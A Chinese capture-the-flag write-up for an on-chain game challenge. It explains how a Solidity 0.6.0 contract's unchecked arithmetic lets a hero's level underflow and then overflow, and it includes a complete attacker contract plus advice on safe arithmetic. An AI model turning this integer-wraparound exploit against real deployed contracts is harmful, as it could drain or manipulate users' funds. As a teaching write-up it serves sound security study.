# 勇者的链上奇妙冒险

## 题目简述

目标合约使用 Solidity 0.6.0，整数加减默认不会检查上溢/下溢。正常沉淀无法把勇者等级提升到足以击败 Boss，但连续失败会让无符号等级从 0 下溢到最大值；击败 Boss 后再沉淀一次，又可让最大值上溢回 0，以满足最终等级检查。

## 解题过程

根据题目逻辑，前 21 次 `tryattack()` 都失败并递减等级，第 21 次使等级下溢为 `uint` 最大值；第 22 次攻击便能击败 Boss。此时最终检查还要求等级低于 Boss，因此调用一次 `chendian()`，让最大值加一回绕到 0，再调用 `isSolved()`。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.6.0;

interface IAdventure {
    function chendian() external;
    function tryattack() external;
    function isSolved() external;
}

contract Attack {
    IAdventure public target;

    constructor(address targetAddress) public {
        target = IAdventure(targetAddress);
    }

    function hack() external {
        for (uint256 i = 0; i < 22; i++) {
            target.tryattack();
        }
        target.chendian();
        target.isSolved();
    }
}
```

部署时把题目实例地址作为构造参数，随后调用一次 `hack()`。全部状态变化发生在同一笔交易中，若任何一步回滚，整个序列也会回滚。

## 方法总结

Solidity 0.8 以前的整数运算默认回绕，状态机若把加减结果直接用于权限或胜负判断，就可能被极值绕过。修复应使用安全算术库或显式边界检查，并把等级、Boss 状态和 solved 条件设计成不会依赖可回绕的哨兵值。
